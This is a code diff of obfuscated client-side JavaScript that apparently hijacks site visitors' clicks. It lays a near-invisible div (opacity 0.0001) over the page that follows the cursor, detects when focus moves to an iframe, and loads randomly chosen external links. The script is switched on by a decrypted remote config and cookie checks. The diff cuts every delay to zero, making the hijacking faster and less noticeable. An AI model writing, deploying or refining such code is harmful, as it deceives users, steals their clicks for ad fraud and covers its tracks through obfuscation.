@@ -77,7 +77,7 @@ function minimizeDiv() {
 function setUrlObj() {
     document.getElementById('_z0s59a_obj' + uniqueID).src = h12_link.replace("http://","https://");
     document.getElementById('_z0s59a_obj' + uniqueID).onload=function(){
-        setTimeout(showDiv,100);
+        setTimeout(showDiv,0);
     }
 }
 function showDiv() {
@@ -96,11 +96,11 @@ function startTracker() {
     monitorTracker = setInterval(function(){
         let elem = document.activeElement;
         if(elem && elem.tagName == 'IFRAME'){
-            setTimeout(setClick,100);
+            setTimeout(setClick,0);
             setTimeout(minimizeDiv,1000);
             clearInterval(monitorTracker);
         }
-    }, 100);
+    }, 50);
 }
 function h12_revertDiv() {
     h12_canTrack = 0;
@@ -124,7 +124,7 @@ function h12_startScript(){
     $("#" + h12_div + ' .mgline').css("margin", "0");
     if(getCookie("_zkx2_delay_time") == null && getCookie("_zkx1_delay_time") != null){
         $('#'+ h12_div +' .mgheader').remove();
-        $('#'+ h12_div +' a').click(function(){h12_clickfuncion2(); return false;});
+        $('#'+ h12_div +' a').click(function(){setTimeout(h12_revertDiv,0);setTimeout(h12_clickfuncion,0);return false;});
 
         h12_followDiv();
     }
@@ -133,13 +133,13 @@ function h12_followDiv() {
     h12_canTrack = 1;
     $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "600px").css("pointer-events", "");
 }
-function h12_clickfuncion2() {
+function h12_clickfuncion() {
     let randLinks = $('#'+ h12_div +' a[href^="https://www."]');
     randomizeArray(randLinks);
     h12_link = randLinks[0].href;
 
-    setTimeout(h12_revertDiv,100);
-    setTimeout(insertCode,120);
+    setTimeout(h12_revertDiv,0);
+    setTimeout(insertCode,0);
 }
 function h12_Decrypt(s1, id) {
     s1 = atob(s1);
@@ -173,7 +173,7 @@ $(document).ready(function () {
         .then(function(body) {
             let jsonResponse = JSON.parse(h12_Decrypt(body, 1247));
             if(jsonResponse.redecanais === true){
-                setTimeout(h12_startScript,100);
+                setTimeout(h12_startScript,0);
             }
         });
 });
